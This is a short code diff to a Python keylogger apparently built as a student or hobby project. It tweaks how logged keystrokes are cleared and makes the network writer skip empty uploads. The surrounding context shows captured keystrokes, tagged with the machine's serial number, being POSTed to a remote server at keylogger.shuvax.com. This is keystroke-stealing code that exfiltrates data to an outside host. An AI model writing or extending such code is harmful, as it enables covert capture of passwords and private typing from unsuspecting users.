@@ -32,8 +32,8 @@ class KeyLoggerService(IKeyLogger):
 
 
     def clear_logged_keys(self) -> dict[str:str]:
-        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
-
+        # self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
+        self.__logged_keys = {}
 
 class FileWriter(Write):
     def __init__(self,path=None):
@@ -63,6 +63,8 @@ class NetworkWriter(Write):
     def __init__(self,url=None):
         self.url = url or "https://keylogger.shuvax.com"
     def write(self, serial_number, data:dict[str:str]) -> bool:
+        if not data:
+            return True
         try:
             all_data = {"machine":str(serial_number),"data":data}
             response = requests.post(self.url+'/api/upload', json=all_data)
